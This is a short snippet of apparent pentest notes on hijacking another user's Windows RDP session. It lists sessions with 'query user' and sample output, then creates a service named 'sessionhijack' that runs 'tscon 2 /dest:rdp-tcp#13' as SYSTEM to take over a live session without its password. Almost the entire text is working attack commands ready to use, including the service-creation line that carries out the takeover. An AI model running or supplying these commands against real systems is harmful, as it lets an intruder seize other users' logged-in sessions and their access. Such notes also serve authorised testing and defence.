>Need `SYSTEM` privilege. Can be achieved with `local administrator` or `server operator` privilege

Query all sessions now

```cmd
query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```

Switch to that session. Because we need `SYSTEM` privilege, we can create a service, which by default will run with `SYSTEM` privilege

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```


